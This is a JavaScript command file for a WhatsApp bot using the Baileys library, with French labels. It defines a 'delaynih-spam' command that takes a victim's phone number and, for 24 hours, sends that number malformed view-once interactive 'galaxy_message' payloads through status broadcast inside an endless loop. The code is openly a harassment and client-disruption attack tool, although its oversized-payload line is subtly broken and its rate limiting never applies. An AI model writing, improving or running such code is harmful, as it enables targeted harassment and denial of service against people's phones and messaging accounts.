// ./commands/delaynih.js

import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default {
  name: "delaynih-spam",
  description: "Lance un spam avec la fonction delaynih",

  async execute(context) {
    const { sock, from, msg, args } = context;

    const targetNumber = args?.[0] || "";

    const opts = msg ? { quoted: msg } : {};

    if (!targetNumber) {
      return { success: false, message: "Numéro manquant" };
    }

    const number = targetNumber.replace(/[^0-9]/g, "");
    if (number.length < 8) {
      return { success: false, message: "Numéro invalide" };
    }

    const target = number + "@s.whatsapp.net";

    try {
      const START = Date.now();
      const DURATION = 24 * 60 * 60 * 1000;      // 24 heures
      const ACTION_INTERVAL = 5 * 60 * 1000;     // 5 minutes
      const MAX_PER_HOUR = 12; // 12 par heures

      let hourCount = 0;
      let hourStart = Date.now();

      async function delaynih(prim, target) {
        while (true) {
          const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  nativeFlowResponseMessage: {
                    version: 3,
                    name: "galaxy_message",
                    paramsJson: "".repeat(1045000)
                  },
                  contextInfo: {
                    entryPointConversionSource: "call_permission_request"
                  },
                  body: {
                    format: "DEFAULT",
                    text: "THIS IS - PRIMIS"
                  }
                }
              }
            }
          }, {
            messageTimestamp: (Date.now() / 1000) | 0,
            userJid: target,
            messageId: undefined
          });

          await prim.relayMessage("status@broadcast", msg.message, {
            additionalNodes: [{
              tag: "meta",
              attrs: {},
              content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }]
            }],
            messageId: msg.key?.id || undefined,
            statusJidList: [target]
          }, {
            participant: target
          });
        }
      }

      while (Date.now() - START < DURATION) {
        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        if (hourCount < MAX_PER_HOUR) {
          await delaynih(sock, target);
          hourCount++;
        }

        await new Promise(r => setTimeout(r, ACTION_INTERVAL));
      }

      return { success: true, message: `Spam delaynih terminé sur ${number}` };

    } catch (error) {
      console.error("❌ Erreur delaynih-spam :", error);
      return { success: false, message: "Spam delaynih interrompu" };
    }
  }
};